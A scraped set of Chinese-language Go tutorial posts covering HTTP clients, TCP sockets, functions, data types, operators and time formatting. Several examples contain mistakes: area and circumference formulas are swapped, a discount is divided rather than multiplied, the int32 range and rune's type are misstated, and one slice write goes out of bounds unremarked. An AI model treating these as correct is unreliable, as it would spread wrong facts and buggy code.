综上所述，net/http server.go 一切的基础为ServeMux 和 Handler\nGo语言的net/http包还封装了常用处理器，如 FileServer，NotFoundHandler RedirectHandler\nhttp客户端的使用 简单的Get请求 package main import ( \u0026quot;bytes\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;reflect\u0026quot; ) func main() { resp, err := http.Get(\u0026quot;http://www.baidu.com\u0026quot;) if err != nil { fmt.Println(err) return } fmt.Println(reflect.TypeOf(resp.Body)) // *http.gzipReader b := bytes.NewBuffer(make([]byte, 1024)) b.ReadFrom(resp.Body) fmt.Println(string(b.Bytes())) } post请求 package main import ( \u0026quot;net/http\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;io/ioutil\u0026quot; \u0026quot;net/url\u0026quot; ) func main() { postParam := url.Values{ \u0026quot;user\u0026quot;: {\u0026quot;xxxxxx\u0026quot;}, \u0026quot;Pwd\u0026quot;: {\u0026quot;1\u0026quot;}, } resp, err := http.PostForm(\u0026quot;http://www.baidu.com/loginRegister/login\u0026quot;, postParam) if err != nil { fmt.Println(err) return } defer resp.Body.Close() body, err := ioutil.ReadAll(resp.Body) if err != nil { fmt.Println(err) return } fmt.Println(string(body)) } 构建客户端请求 package main import ( \u0026quot;fmt\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;io/ioutil\u0026quot; ) func main() { url := \u0026quot;http://10.0.0.3:5555/v2/services/haproxy/configuration/version\u0026quot; method := \u0026quot;GET\u0026quot; client := \u0026amp;http.Client { } req, err := http.NewRequest(method, url, nil) if err != nil { fmt.Println(err) } res, err := client.Do(req) defer res.Body.Close() body, err := ioutil.ReadAll(res.Body) fmt.Println(string(body)) } 使用认证 func basicAuth(username, password string) string { auth := username + \u0026quot;:\u0026quot; + password return base64.StdEncoding.EncodeToString([]byte(auth)) } func redirectPolicyFunc(req *http.Request, via []*http.Request) error{ req.Header.Add(\u0026quot;Authorization\u0026quot;,\u0026quot;Basic \u0026quot; + basicAuth(\u0026quot;username1\u0026quot;,\u0026quot;password123\u0026quot;)) return nil } func main() { client := \u0026amp;http.Client{ Jar: cookieJar, CheckRedirect: redirectPolicyFunc, } req, err := http.NewRequest(\u0026quot;GET\u0026quot;, \u0026quot;http://localhost/\u0026quot;, nil) req.Header.Add(\u0026quot;Authorization\u0026quot;,\u0026quot;Basic \u0026quot; + basicAuth(\u0026quot;username1\u0026quot;,\u0026quot;password123\u0026quot;)) resp, err := client.Do(req) } Reference\nBasic HTTP Auth in Go\n","permalink":"https://www.oomkill.com/2019/10/go-net/","summary":"","title":"go net/http使用"},{"content":"在TCP/IP协议中，“IP地址+TCP或UDP端口号”唯一标识网络通讯中的一个进程。“IP地址+端口号”就对应一个socket。欲建立连接的两个进程各自有一个socket来标识，那么这两个socket组成的socket pair就唯一标识一个连接。因此可以用Socket来描述网络连接的一对一关系。\n常用的Socket类型有两种：流式Socket（SOCK_STREAM）和数据报式Socket（SOCK_DGRAM）。流式是一种面向连接的Socket，针对于面向连接的TCP服务应用；数据报式Socket是一种无连接的Socket，对应于无连接的UDP服务应用。\n套接字通讯原理示意\nTCP的C/S架构 在整个通信过程中，服务器端有两个socket参与进来，但用于通信的只有conn这个socket。它是由 listener创建的。隶属于服务器端。客户端有一个socket参与进来。\nnet.Listen() 建立一个用于连接监听的套接字 listen.Accept() // 阻塞监听客户端连接请求，成功用于连接，返回用于通信的socket net.Dial() 客户端向服务端发起连接建立一个socket连接\n并发的C/S模型通信 Server Accept()函数的作用是等待客户端的链接，如果客户端没有链接，该方法会阻塞。如果有客户端链接，那么该方法返回一个Socket负责与客户端进行通信。所以，每来一个客户端，该方法就应该返回一个Socket与其通信，因此，可以使用一个死循环，将Accept()调用过程包裹起来。\n需要注意，实现并发处理多个客户端数据的服务器，就需要针对每一个客户端连接，单独产生一个Socket，并创建一个单独的goroutine与之完成通信。\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;net\u0026quot; \u0026quot;strings\u0026quot; ) func handleConnect(conn net.Conn){ var ( b []byte err error n int ) fmt.Println(conn.RemoteAddr(),\u0026quot;建立连接.\u0026quot;) defer conn.Close() b = make([]byte,4096) // 客户端可能持续不断的发送数据，因此接收数据的过程可以放在for循环中，服务端也持续不断的向客户端返回处理后的数据。 for { n,err = conn.Read(b) content := strings.Trim(string(b[:n]),\u0026quot;\\r\\n\u0026quot;) // window中传送的内容存在换行符，作为判断时需要删除 // 当客户端退出，服务端从chan中读取内容时是没有的，因此的到0 或者客户端主动退出输入exit或者quit if n == 0 || content == \u0026quot;exit\u0026quot; || content == \u0026quot;quit\u0026quot; { fmt.Println(\u0026quot;客户端退出：\u0026quot;,conn.RemoteAddr()) return } if err != nil { fmt.Println(err) return } if _,err = conn.Write([]byte(fmt.Sprintf(\u0026quot;server reply:%s\u0026quot;,b[:n])));err !=nil { fmt.Println(err) return } fmt.Println(\u0026quot;client send: \u0026quot;,content) } } func main() { var ( listener net.Listener err error conn net.Conn ) // 建立一个用于连接监听的套接字 if listener, err = net.Listen(\u0026quot;tcp\u0026quot;, \u0026quot;10.0.0.1:8088\u0026quot;); err != nil { fmt.Println(err) return } defer listener.Close() fmt.Println(\u0026quot;waiting client connect.\u0026quot;) // 阻塞监听客户端连接请求，成功用于连接，返回用于通信的socket for { if conn, err = listener.Accept(); err != nil { fmt.Println(err) return } go handleConnect(conn) } } 使用nc作为客户端向服务端发送信息\n自定义客户端 客户端需要持续的向服务端发送数据，同时也要接收从服务端返回的数据。因此可将发送和接收放到不同的协程中。\n主协程循环接收服务器回发的数据（该数据应已转换为大写），并打印至屏幕； 子协程循环从键盘读取用户输入数据。 读取键盘输入可使用 os.Stdin.Read()。 注意事项：\n服务端有对 exit返回的是 io.EOF 当服务端断开时，chan读取的信息就为0了即服务端已经退出，如果客户端不退出会一直报错 package main import ( \u0026quot;fmt\u0026quot; \u0026quot;io\u0026quot; \u0026quot;net\u0026quot; \u0026quot;os\u0026quot; \u0026quot;strings\u0026quot; ) func main() { var ( conn net.Conn err error n int ) if conn, err = net.Dial(\u0026quot;tcp\u0026quot;, \u0026quot;10.0.0.1:8088\u0026quot;); err != nil { fmt.Println(err, 111) return } defer conn.Close() go func() { str := make([]byte, 1024) for { n, err := os.Stdin.Read(str) content := strings.ToLower(strings.Trim(string(str[:n]), \u0026quot;\\r\\n\u0026quot;)) if n == 0 { fmt.Println(\u0026quot;与服务端断开连接\u0026quot;) return } if err == io.EOF || content == \u0026quot;quit\u0026quot; { return } if err != nil { fmt.Println(1, err) continue } _, err = conn.Write([]byte(content)) if err != nil { fmt.Println(111, err) return } } }() byt := make([]byte, 1024) for { if _, err = conn.Read(byt); err != nil { if err == io.EOF { return } fmt.Println(err) continue } fmt.Println(\u0026quot;server reply:\u0026quot;, string(byt[:n])) } } ","permalink":"https://www.oomkill.com/2019/10/go-tcp-in-go/","summary":"","title":"Go socket TCP协议实现"},{"content":"golang保留的函数 init(), main()是golang的保留函数，有如下特点：\nmain() 只能用在main包中，仅可定义一个，init() 可定义任意包，可重复定义，建议只定义一个 两个函数定义时不能有任何返回值 只能由go自动调用，不可被引用 init() 先于 main() 执行，并不能被其他函数调用，执行时按照main import顺序执行。 包的执行顺序 Go的初始化和执行总是从main.main函数（main包导入其它的包） 同包下的不同 .go 文件，按照以文件名或包路径名的字符串顺序“从小到大”排序顺序执行 其他的包只有被main包 import 才会执行，按照 import 的先后顺序执行; 如果某个包被多次导入的话，在执行的时候只会导入一次; 当一个包被导入时，如果它还导入了其它的包，则先将其它的包包含进来; 导入顺序与初始化顺序相反 main =\u0026gt; p1 =\u0026gt; p2 | p2 =\u0026gt; p1 =\u0026gt; p main被最后一个初始化，因其总是依赖其他包 函数 函数是将具有独立功能的代码组织成为一个整体，使其具有特殊功能的代码集。在Go语言中，函数是一种数据类型，其特性有如下：\n支持匿名函数 支持带有变量名的返回值 支持多值返回 支持匿名函数 不支持重载，一个包中不能有两个名字一样的函数。 定义语法\nfunc test(){ } func test(a int, b int){ } func test(a,b int){ } func test(a,b int list...int){ } func test(a int, b int) int{ } func test(a int, b int ) (int,int){ } func test(a,b int) (num int, err error){ } 花括号必须与函数声明在同一行，这种写法是错误的\nfunc test() { } 命名返回值名称 package main import \u0026quot;fmt\u0026quot; func test(a, b, c int) (he int, cha int) { he = a + b + c cha = a - b - c return } func main() { a, b := test(15, 10, 5) fmt.Println(a) fmt.Println(b) } _标识符，用来忽略返回值\n函数参数传递方式 \\1. 值传递 \\2. 引用传递\n注意：无论是值传递，还是引用传递，传递给函数的都是变量的副本，不过，值传递是值的持贝。引用传递是地址的持贝，一般来说，地址持贝更为高效。而值持贝取决于拷贝的对象大小，对象越大，则性能越低。\n注意2：map、slice、chan、指针、interface默认以引用的方式传递\n自定义函数类型 package main import \u0026quot;fmt\u0026quot; type ty_func func(int, int) int func add(a, b int) int { return a + b } func operator(op ty_func, a, b int) int { return op(a, b) } func main() { c := add sum := operator(c, 100, 200) fmt.Println(sum) } 不定参数 不定参数可以通过下标/循环方式获取参数值 不定参数在定义时，固定参数放前面，不定参数放后面 在对函数调用时，固定参数必须传值，不定参数可以根据需要来决定是否要传值 语法\nfunc {func_name}({param} ...{type}){ func_body } 参数的类型是一个 {type} 类型的集合\n练习：写一个函数add，支持1个或多个int相加，并返回相加结果\npackage main import \u0026quot;fmt\u0026quot; func test(num ...int) { var sum int for n := 1; n \u0026lt;= len(num); n++ { sum += num[(n - 1)] } fmt.Println(sum) } func main() { test(1) test(1, 2, 3) test(1, 2, 3, 4) } 练习：写一个函数concat，支持1个或多个string相拼接，并返回结果\nfunc concat(age ...string) { var str string for _,v := range age { str += v } fmt.Println(str) } func main() { concat(\u0026quot;hellow\u0026quot;, \u0026quot; world\u0026quot;, \u0026quot; go\u0026quot;) } 延迟调用defer 当函数返回时，执行defer语句。因此，可以用来做资源清理 多个defer语句，按LIFO（后进先出）的顺序执行 defer语句中的变量，在defer声明时就决定了。 用途\n关闭文件句柄 锁资源释放 数据库连接释放 defer语句中的变量，在defer声明时就决定了其值\nfunc defer_test() { i := 0 defer fmt.Println(i) i = 10 fmt.Println(i) } func main() { defer_test() } 多个defer按LIFO（后进先出）的顺序执行\nfunc defer_test() { i := 0 defer fmt.Println(i) i = 10 fmt.Println(i) } func main() { defer_test() } defer的作用域，此处可以看到，defer的传入不是在main的作用域下，测试可发现 defer只会在当前函数和方法返回之前被调用。\npackage main import \u0026quot;fmt\u0026quot; func main() { fmt.Println(\u0026quot;block starts\u0026quot;) { defer fmt.Println(\u0026quot;defer runs\u0026quot;) fmt.Println(\u0026quot;block ends\u0026quot;) } fmt.Println(\u0026quot;main ends\u0026quot;) } 函数作用域 全局变量：既能在函数中使用，也能在其他函数中使用，可以称为定义在函数外的变量。\n局部变量：定义在函数内部的变量成为局部变量，局部变量的作用域在函数内部。\n如果全局变量的名字和局部变量的名字相同，使用的是局部变量\n匿名函数 package main import \u0026quot;fmt\u0026quot; var ( test = func(a, b int) int { return a + b }(10, 20) ) var test1 = func(age ...int) int { var sum int for n := 0; n \u0026lt; len(age); n++ { sum += age[n] } return sum } func main() { c := test fmt.Println(c) d := test1(100, 100, 100) fmt.Println(d) } ","permalink":"https://www.oomkill.com/2019/10/go-function/","summary":"","title":"Go 函数 function"},{"content":"Go语言将数据类型分为四类：基础类型、复合类型、引用类型和接口类型。\n基础数据类型包括：\n基础类型： - 布尔型、整型、浮点型、复数型、字符型、字符串型、错误类型。 复合数据类型包括： - 指针、数组、切片、字典、通道、结构体、接口。 基础数据类型 布尔值和布尔表达式 布尔类型的变量取值结果要么是真，要么是假，用bool关键字进行定义\n布尔类型默认值为 false\n指定格式的输出 %t\n语法 描述/结果 !b 逻辑非操作符 b值为true 则 操作结果为false a || b 短路逻辑或，只要布尔值 a b 中任何一个为true表达式结果都为true a \u0026amp;\u0026amp; b 短路逻辑与，两个表达式a b都为true，则整个表达式结果为true x \u0026gt; y 表达式x的值小于表达式Y的值，则表达式的结果为true 数值类型 go语言提供了大内置的数值类型，标准库也提供了big.Int类型的整数，和big.Rat类型的有理数，这些都是大小不限（只限于机器内存）\n整型 GO语言提供了11种整型，包含5种有符号，和5种无符号的与一种用于存储指针的整数类型。Go语言允许使用byte来作为无符号uint8类型的同义词，在使用单个字符时提倡使用rune来替代 int32\n类型 存储空间 取值范围 byte 8-bit 同uint8 int 系统决定 依赖不通平台实现，32位操作系统为int32的值范围，64位操作系统为int64的值范围 int8 8-bit [-128, 127] ，表示 UTF-8 字符串的单个字节的值，对应 ASCII 码的字符值 int16 16-bit [-32678, 32767] int32 32-bit [2147483648, 2147483647] int64 64-bit [-9223372036854775808 , 9223372036854775807] rune 32-bit 同uint32，表示 单个 Unicode 字符 uint 系统决定 依赖不通平台下的实现，可以是uint32或uint64 uint8 8-bit uint16 16-bit [0, 65535] uint32 32-bit [0, 4294967295] uint64 64-bit [0, 18446744073709551615] uintptr 系统决定 一个可以恰好容纳指针值得无符号整数类型（32位操作系统为uint32的值范围，64位系统为uint64的值范围） 浮点类型 Go语言提供了两种类型的浮点类型和两种类型的复数类型，\n类型 存储空间 取值范围 float32 32-bit [1.401298464324817070923729583289916131280e-45 , 3.402823466385288598117041834516925440e+38] 精确到小数点后7位 float64 64-bit [4.940656458412465441765687928682213723651e-324 , 1.797693134862315708145274237317043567981e+308] 精确到小数点后15位 complexm64 64-bit 实部和虚部都是一个float32 complexm128 128-bit 实部和虚部都是一个float64 fmt.printf(\u0026quot;%.2f\u0026quot;,num) // 保留两位小数，同时进行了四舍五入 字符串 (string) 字符串使用双引号 \u0026quot; 或者反引号 ```来创建，双引号可以解析字符串变量\n定义字符变量用 byte 关键词 var ch byte = 'a' 8-bit，代表了 ASCII 码的一个字符。指定格式的输出 %c 定义字符变量用 rune 关键词 var ch rune = 'a' 32-bit 代表了 Unicode（UTF-8）码的一个字符。 定义字符变量用 string 关键词 var ch string = \u0026quot;abc\u0026quot;指定格式的输出 %s\n字符串的结束标志 \\0，Go语言使用的UTF8编码，英文占1个字符，一个汉字占3个字符\n自动推导类型 自动推到类型，创建的浮点型默认为 float64，整型为int\na := \u0026quot;123\u0026quot; a := 10 使用fmt格式化输出 格式指令通常由用于输出单个值，每个值都按格式指令格式化。用于fmt.Printf() fmt.Errorf() fmt.Fprintf() fmt.Sprintf()函数的格式字符串包含一个或多个格式指令\n格式指令 含义/结果 %b 二进制数值 %c 数值对应的 Unicode 编码字符 %d 十进制数值 %o 八制数值 %e 科学计数法，e表示 %E 科学计数法，E表示 %f 有小数部分，无指数部分 %g 以%f或%e表示浮点数或复数 %G 以%f或%E表示浮点数或复数 %s 直接输出字符串或者[]byte %q 双引号括起来的字符串或者[]byte %x 每个字节用两字节十六进制表示，a-f表示 %X 每个字节用两字节十六进制表示，A-F表示 %t 以true或fales输出布尔值 %T 输出值得类型 %v 默认格式输出内置或自定义类型的值 强制类型转换 类型转换用于将一种数据类型转换为另外一种类型\nvar num float64 = 3.15 fmt.Printf(\u0026quot;%d\u0026quot;, int(num)) 类型不一致的不能进行运算，在类型转换时，建议将低类型转换为高类型，保证数据精度，高类型转换成地类型，可能会丢失精度，或数据溢出\n复合数据类型 数组 数组，一系列同一类型数据的集合，数组是值类型,在初始化后长度是固定的，无法修改其长度。\n数组的定义 var arr [元素数量]类型\n数组初始化 全部初始化 var arr [5]int = [5]int{1,2,3,4,5}\n部分初始化 var arr [5]int = [5]int{1,2} ,没有指定初值的元素将会赋值为其元素类型(int)的默认值(0)\n指定下标初始化 var arr = [5]int{2:5, 3:6} key:value的格式\n通过初始化确定数组长度，var arr = [...]int{1, 2, 3} 长度是根据初始化时指定个数\n相同空间大小（类型）的数组可以用 == != 来比较是否相同。\npackage main import \u0026quot;fmt\u0026quot; func main() { var arr [2]int = [2]int{1, 2} var arr2 [2]int = [...]int{2, 2} fmt.Println(arr == arr2) } D:\\go_work\\src\u0026gt;go run main.go false 数组的遍历 通过 for .. len() 完成遍历 通过 for .. range 完成遍历 作为函数值传递 golang数组是值类型，当数组作为函数参数，函数中修改数组中的值，不会影响原数组\npackage main import \u0026quot;fmt\u0026quot; func test(t [2]int) { fmt.Println(\u0026amp;t) } func main() { var arr [2]int = [2]int{1, 2} test(arr) } 二维数组 初始化方式\n全部初始化 var arr [2][2]int = [2][2]int{ {1,2},{3,4} } 部分初始化 var arr [2][2]int = [2][2]int{ {1,2},{3} } 指定元素初始化 var arr [2][2]int = [2][2]int{ 1:{1} }，var arr [2][2]int = [2][2]int{ 1:{1:3} } 通过初始化确定二维数组行数 var arr [...][2]int = [2][2]int{ {1,2},{3,4} } 行下标可以用 ... 列下标不可用 ... map Go语言中的字典结构是有键和值构成的，所谓的键，就类似于字典的索引，可以快速查询出对应的数据。\nmap是只用无序的键值对的集合。\nmap最重要的一点是通过key来快速检索数据，key类似于索引，指向数据的值。\nmap中key的值是不能重复的\n引用类型或包含引用类型的数据类型不能作为key\nmap的创建 字面量：var map_name map[keyType]valType 类型推导： map_name := map[keyType]valType 关键词：make(map[keyType]valType) map的初始化 字面量：var maps[int]string = map[int]string{1: \u0026quot;zhangsan\u0026quot;, 2: \u0026quot;lisi\u0026quot;} 类型推导： maps := map[int]string{1: \u0026quot;zhangsan\u0026quot;, 2: \u0026quot;lisi\u0026quot;} 关键词：maps := make(map[string]int,10); maps[\u0026quot;zhangsan\u0026quot;] = 14 map的key value 通过key获取值时，判断key是否存在 var1, var2 := map[key]，如存在，var1存储对应的值，var2的值为true，var2否则为false\npackage main import \u0026quot;fmt\u0026quot; func initial(t []int) { for n := 0; n \u0026lt; 10; n++ { t[n] = n } } func main() { var m map[int]string = map[int]string{1: \u0026quot;zhangsan\u0026quot;, 2: \u0026quot;lisi\u0026quot;} fmt.Println(m) v, ok := m[2] if ok { fmt.Println(v) } else { fmt.Println(ok) } v, ok = m[3] if ok { fmt.Println(v) } else { fmt.Println(ok) } } delete(map,2) 通过key删除某个值\n作为函数参数传递 slice map channel都是引用类型，所以改变是改变的变量的地址。\npackage main import \u0026quot;fmt\u0026quot; func initial(t map[int]string) { for n := 0; n \u0026lt; 10; n++ { t[n] = fmt.Sprintf(\u0026quot;aaa%d\u0026quot;, n) } } func main() { var m = make(map[int]string, 10) initial(m) fmt.Println(m) } 切片 切片与数组相比，切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大，所以可以将切片理解为“动态数组”，但是，它不是数组。\n切片定义 var slice_name []type 默认空切片，长度为0\nslice_name := []type{} 默认空切片，长度为0\nmake([]type, length, capacity) length：已初始化的空间，capacity：已开辟的空间（length+空闲）。length不能大于capacity\nlen() 返回长度 cap() 返回容量\n如果使用字面量的方式创建切片，大部分的工作就都会在编译期间完成，使用 make() 关键字创建切片时，很多工作都需要运行时的参与。\n切片初始化 通过 var slice_name []type 方式创建\nimport \u0026quot;fmt\u0026quot; func main() { var slices []int slices = append(slices, 1, 2, 3, 4, 5, 6) fmt.Print(slices) slices = append(slices, 100, 99) fmt.Print(slices) } 通过 slice_name := []type{} 方式创建\n直接在 {} 中添加值 通过 append() 添加 通过 make([]type, length, capacity) 方式创建\npackage main import \u0026quot;fmt\u0026quot; func main() { var slices []int slices = make([]int, 3, 5) slices[0] = 1 slices[1] = 2 slices[2] = 3 slices[3] = 4 fmt.Println(slices) } 切片的截取 切片截取\n操作 含义 s[n] 切片s中索引位置为N的项 s[:] 从切片s的索引位置到 len(s) - 1 处所获得的切片 s[low:] 从切片s的索引位置low到 len(s) - 1 处所获得的切片 s[:high] 从切片s的索引位置0到high处所获得的切片 len=high s[low:higt] 从切片s的索引位置low到high处所获得的切片 len=high-low s[low:higt:max] 从切片s的索引位置low到high处所获得的切片，len=high-low，cap=max-low len(s) 切片s的长度，\u0026lt;=cap(s) cap(s) 切片s的容量，\u0026gt;=len(s) slice[startVal, length, Capacity]\n容量为：capacity - startVal\n长度为： length - startVal\npackage main import \u0026quot;fmt\u0026quot; func main() { var slices []int slices = []int{1, 2, 3, 4, 5, 6, 7, 8} s := slices[1:3:5] fmt.Println(s) fmt.Println(len(s)) fmt.Println(cap(s)) } 在截取时，capacity 不能超过原slice的 capacity\npackage main import \u0026quot;fmt\u0026quot; func main() { var slices []int slices = []int{1, 2, 3, 4, 5, 6, 7, 8} s := slices[1:3:10] fmt.Println(s) fmt.Println(len(s)) fmt.Println(cap(s)) } 切片值得修改 问：切片截取后返回新切片，对新切片的值修改，会影响原切片吗\n当对切片进行截取操作后，产生了新的切片，新的切片是指向原有切片的，对新切片值修改，会影响到原有切片\npackage main import \u0026quot;fmt\u0026quot; func main() { var slices []int slices = []int{1, 2, 3, 4, 5, 6, 7, 8} s := slices[1:3] s[1] = 100 fmt.Println(s) fmt.Println(slices) } 追加和拷贝 append(slice, 1,2,3) 向切片末尾追加数据 copy(slice1, slice2) 拷贝的长度为两个切片中长度较小的长度值 作为参数值传递，切片是数组的一个引用，因此切片是引用类型，操作会修改原有切片\npackage main import \u0026quot;fmt\u0026quot; func initial(t []int) { for n := 0; n \u0026lt; 10; n++ { t[n] = n } } func main() { var slices = make([]int, 10) fmt.Println(slices) initial(slices) fmt.Println(slices) } 切片扩容 切片扩容，一般方式：上一次容量的2倍，超过1024字节，每次扩容上一次的1/4\npackage main import \u0026quot;fmt\u0026quot; func initial(t []int) { for n := 0; n \u0026lt; 10; n++ { t[n] = n } } func main() { var slices = make([]int, 3) var slices1 = []int{4, 5} copy(slices, slices1) fmt.Println(slices) fmt.Println(slices1) } struct 结构体 结构体 struct 是由一系列具有相同类型或不同类型的数据构成的数据集合，结构体可以很好的管理一批有联系的数据，使用结构体可以提高程序的易读性。Go中提供了对 struct 的支持，与数组一样，struct属于复合类型，并非引用类型。\nGo语言中结构体包含以下特性\n值传递，Go语言中结构体和数组一样是值类型，可以声明结构体指针向下传递 不可继承，Go语言中没有继承的概念，在结构体中，可以通过组合结构体，来构建更复杂的结构体。 结构体不能包含自己。 结构体声明 成员名称前不能加 var\ntype Student struct { id int name string age int addr string } 空结构体 结构体也可以不包含任何字段，称为空结构体 struct{}\n结构体初始化 顺序初始化 var stu = Student{ id:101, name:\u0026quot;zhangsan\u0026quot;, age:19, addr:\u0026quot;shanghai\u0026quot; } 指定成员初始化 var stu = Student{name:\u0026quot;zhangsan\u0026quot;, age:19} 通过 结构体变量.成员 完成初始化 var stu Student stu.age=19 stu.addr=\u0026quot;peking\u0026quot; 结构体传递 结构体与数组一样，都是值传递，将结构体作为函数实参传给函数的形参时，会复制一个副本，所以为了提高性能，在结构体传给函数时，可以使用指针结构体。\n指针结构体定义：声明结构体变量时，在结构体类型前加 * 号，便声明一个指向结构体的指针。 var stu *Student。 指针结构体访问： 由于.的优先级高于*struct_name,故在使用时，需要对结构体加括号。(*struct_name).成员属性 (*stu).name\n","permalink":"https://www.oomkill.com/2019/10/go-datastruct/","summary":"","title":"Go 数据结构"},{"content":"算术运算符 运算符 示例 结果 + 10 + 5 15 - 10 - 5 5 * （除数不能为0） 10 * 5 50 / 10 / 5 2 % （除数不能为0） 10 % 3 1 ++ a = 0; a++ a = 1 \u0026ndash; a = 2; a\u0026ndash; a = 1 总结\n除法/取余运算除数不能为0 只有后自增/减，没有前自增/减。没有 ++a 或 --a 只有 a++ 或 a-- 输入半径，计算圆的面积和周长并打印出来（PI为3.14）\npackage main import \u0026quot;fmt\u0026quot; func main() { const PI = 3.14 fmt.Println(\u0026quot;请输入半径：\u0026quot;) var r float64 fmt.Scan(\u0026amp;r) fmt.Printf(\u0026quot;面积为：%.2f\\n\u0026quot;, 2*PI*r) fmt.Printf(\u0026quot;周长为：%.2f\\n\u0026quot;, PI*r*r) } 某学生三门课成绩为，语文90，数学89，英语69，编程求总分与平均分\npackage main import \u0026quot;fmt\u0026quot; func main() { var ( chinese = 90 math = 89 english = 69 ) score := chinese + math + english //avg := score / 3 // 此处是整数值 avg := float64(score) / 3 fmt.Printf(\u0026quot;总分为：%d\\n\u0026quot;, score) fmt.Printf(\u0026quot;平均分为：%.2f\\n\u0026quot;, avg) } 问题: 计算商品价格\n问题1： 某商店T-shirt的价格为35圆/件，裤子的价格120圆/条，小明在该店购买了3件t-shirt和2条裤子，并且打8.8折，小明应该付多少钱\n问题2：如上题打完8.8折后，出现小数，商店为了方便结算只收取商品整数部分的钱，如 303.6，则只收取303元。\npackage main import \u0026quot;fmt\u0026quot; func main() { var ( tshirt = 35 trousers = 120 ) total := 3*tshirt + 2*trousers realMember := float64(total) / 0.88 fmt.Printf(\u0026quot;打88折后价格为：%.2f\\n\u0026quot;, realMember) fmt.Printf(\u0026quot;只收取整钱为：%d\u0026quot;, int(realMember)) } 赋值运算符 运算符 说明 实例 = 普通赋值 c = a + b 将a + b表达式结果赋值给c += 相加后在赋值 c += a 等价于 c = c + a -= 相减后再赋值 c -= a 等价于 c = c - a *= 相乘后再赋值 c *= a 等价于 c = c * a /= 相除后再赋值 c /= a 等价于 c = c / a %= 取余后再赋值 c %= a 等价于 c = c % a 算数运算符优先级高于赋值运算符\npackage main import \u0026quot;fmt\u0026quot; func main() { num := 20 num %= 2 + 3 fmt.Println(num) } 关系运算符 关系运算符的结果是布尔类型的\n优先级 算数 \u0026gt; 关系 \u0026gt; 赋值\n运算符 说明 == 相等于 != 不等于 \u0026lt; 小于 \u0026gt; 大于 \u0026lt;= 小于等于 \u0026gt;= 大于等于 逻辑运算符 \u0026amp;\u0026amp; || !\n逻辑非后面的内容是bool类型\n逻辑非的运算优先级高于关系运算符\n逻辑与/逻辑或运算符优先级低于关系运算符\n\u0026amp;\u0026amp; 逻辑与的优先级高于 || fmt.Println(1 \u0026gt; 2 || 2 \u0026gt; 1 \u0026amp;\u0026amp; 10 != 10)\n单目运算符：指运算所需变量为一个运算符，即在运算当中只有一个操作数。如：a++ ，b--，!test，\u0026amp; 等\n双目运算符：运算所需比那里为两个运算符叫做双目运算符。如：a + b ，a \u0026gt;= b 等\n运算符优先级 算数运算符 * / % \u0026gt; 算数运算符 + - \u0026gt; 比较运算符 \u0026lt; \u0026gt; \u0026gt;= \u0026lt;= == != \u0026gt; 逻辑运算符 \u0026amp;\u0026amp; \u0026gt; 逻辑运算符 || \u0026gt; 赋值运算符\n运算符总结 运算符分为单目运算符双目运算符与特殊运算符 () . 逻辑运算的结果同样也是bool类型 逻辑运算符两边放的一般都是关系运算或者bool类型的值 逻辑非运算符的运算优先级要高于关系运算符 单目运算符是指运算所需变量为一个运算符，即在运算当中只有一个操作数 运算所需变量为两个运算符的叫做双目运算符 单目运算符的优先级高于双目运算符 比较运算符优先级高于逻辑与 逻辑与的运算级别高于逻辑或 ","permalink":"https://www.oomkill.com/2019/10/go-arithmetic/","summary":"","title":"Go 运算符"},{"content":"该文可以快速在Go语言中获得时间的计算。\n在Go中获取时间 如何获取当前时间 now := time.Now() fmt.Printf(\u0026quot;current time is :%s\u0026quot;, now) current time is :2009-11-10 23:00:00 +0000 UTC m=+0.000000001 如何获取UNIX Timestamp cur_time := time.Now().Unix() fmt.Printf(\u0026quot;current unix timestamp is :%v\\n\u0026quot;, cur_time ) 如何获取当日0:00:00 0:00:00 now := time.Now() date := time.Date(now.Year(), now.Month(), now.Day(),0, 0, 0, 0, time.Local) fmt.Printf(\u0026quot;date is :%s\u0026quot;, date) date is :2021-04-13 00:00:00 +0800 如何获取时区时间 标准时间 time.Now().UTC() 本地时区 time.Now().Local()\n// 获取0时区时间 fmt.Printf(\u0026quot;date is :%s\\n\u0026quot;, time.Now().UTC()) date is :2021-04-13 16:02:33.853254 +0000 UTC // 快速设置时区 timeLocation, _ := time.LoadLocation(\u0026quot;Asia/Tokyo\u0026quot;) //使用时区码 fmt.Println(time.Now().In(timeLocation).String()) // 快速设置时区 2021-04-14 01:09:18.140997 +0900 JST Go中的固定时间格式 获取月份 time.April type Month int const ( January Month = 1 + iota February March April May June July August September October November December ) 获取星期 time.Sunday type Weekday int const ( Sunday Weekday = iota Monday Tuesday Wednesday Thursday Friday Saturday ) Go中的时间格式化 Go中时间格式化的格式为 2006-01-02 15:04:05 612345为格式，而不是具体时间\n// YYYY-MM-DD fmt.Println(time.Now().Format(\u0026quot;2006-01-02\u0026quot;)) // YYYY-MM-DD hh:mm:ss fmt.Println(time.Now().Format(\u0026quot;2006-01-02 15:04:05\u0026quot;)) // M-DD fmt.Println(time.Now().Format(\u0026quot;1-02\u0026quot;)) // MM-DD fmt.Println(time.Now().Format(\u0026quot;01-02\u0026quot;) // 获取当前的小时、分钟、秒（整数） nowHour, nowMinute, nowSecond = time.Now().Clock() // 获取前一天 // AddDate(Years, months, days) yesterday = time.Now().AddDate(0,0,-1).Format(\u0026quot;01/02\u0026quot;) // 显示星期英文简写 fmt.Println(time.Now().Format(\u0026quot;2006-01-02 15:04:05 Mon\u0026quot;)) // 星期的大写 fmt.Println(time.Now().Format(\u0026quot;2006-01-02 15:04:05 Monday\u0026quot;)) // 增加微秒 fmt.Println(time.Now().Format(\u0026quot;2006-01-02 15:04:05.000000\u0026quot;)) // 纳秒 fmt.Println(time.Now().Format(\u0026quot;2006-01-02 15:04:05.000000000\u0026quot;)) } // print result 08-10-2018 08-10-2018 21:11:58 08-10-2018 21:11:58 Fri 08-10-2018 21:11:58 Friday 08-10-2018 21:11:58.880934 08-10-2018 21:11:58.880934320 Go中的时间计算 如何获取本周日期有哪些？ 获取一个星期的第一天是几号\nt:=time.Now() fmt.Println(t.Weekday()) // 获取现在时间为本周的星期几 得到本日为星期几后，可以对时间进行计算，因为time包内星期的常量都为int，可以直接进行算数运算. 用一周的第一天减去当日为星期几，如果为0既『本日为本周的第一天』\ntime.AddDate(year, month, date)，仅可以添加年月日 time.Add(Hours, Minutes, Seconds)，仅可以添加时分秒\noffset := int(time.Monday - t.Weekday()) //=-1 